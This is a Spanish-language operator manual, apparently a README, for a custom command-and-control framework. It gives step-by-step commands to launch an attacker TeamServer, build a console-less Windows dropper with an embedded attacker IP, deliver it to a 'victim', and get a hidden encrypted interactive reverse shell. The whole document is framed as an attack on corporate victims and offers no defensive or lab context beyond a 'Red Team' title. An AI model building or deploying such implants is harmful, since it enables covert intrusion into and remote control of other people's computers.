# 📖 MANUAL DE OPERACIONES RED TEAM: C2 FRAMEWORK

La principal ventaja táctica de este C2 es su capacidad de desacoplamiento. Las víctimas Corporativas jamás tendrán Python instalado y mucho menos librerías de hacking de Criptografía de Doble Capa. 

El proceso de este Framework está divido en DOS infraestructuras independientes: **El Servidor (TeamServer)** y la **Armería Compiladora (C2 Builder)**.

---

## FASE 1: Activación del Escudo Central (TeamServer)
El servidor maestro solo debe encenderse en tu máquina atacante (Kali Linux o Windows Hacker).
1. Entra a tu carpeta `C2_Project/`
2. Arranca el motor C2:
   ```bash
   python c2_teamserver.py
   ```
3. El servidor abrirá dinámicamente un canal AES en el Dashboard Web (`https://127.0.0.1:5000`) y generará las llaves públicas RSA que repartirá a los futuros infectados.

---

## FASE 2: Ingeniería del C2 Builder (Infectar Víctimas SIN Dependencias)
No intentes enviar ni arrastrar el documento `agent_v2.py` a la máquina de la víctima, no funcionará. Debes "cocinar" el payload a un formato Máquina Nativo (Windows `.exe` o Linux Nativo).

### Compilando el Artefacto Malicioso (Dropper)
En tu computadora Atacante (la que tiene `python`, `pycryptodome` y `pyinstaller` y el TeamServer corriendo), abre *otra* terminal:

1. Ve a tu directorio de Arsenal: `cd C2_Project/arsenal`
2. Ejecuta la herramienta de armería proporcionada, indicando tu IP Externa donde te escucha tu TeamServer y el puerto (ej: 5000):
   ```bash
   python c2_builder.py 192.168.1.132 5000
   ```
   *(El script `c2_builder.py` modificará el clon en caché de tu `agent_v2.py` e inyectará la IP destino dinámicamente, para después llamar a PyInstaller con rutinas secretas `--noconsole`)*.
3. Al finalizar, la consola indicará la ubicación del Dropper generado: la carpeta `arsenal/dist/` contendrá un mágico y silente `agent_v2.exe`.

---

## FASE 3: Despliegue en Fuego Real (Execution)
1. Envía o arrastra este `agent_v2.exe` blindado al ordenador de la víctima (Windows). Como el compilador incrustó el intérprete y las dependencias de criptografía dentro del binario nativo, **es totalmente inmune a errores de ambiente por falta de módulos Criptográficos**.
2. Al ejecutarlo en la víctima (doble clic), no saldrá ninguna pantalla de consola, no saldrá ningún error. 
3. Operará en Background asíncrono, completará el apretón de manos RSA con tu Servidor Atacante (FASE 1), cifrará la salida en base64-AES y aparecerá automáticamente ruteado a tu consola `https://127.0.0.1:5000` con Shell Completa interactiva PTY.
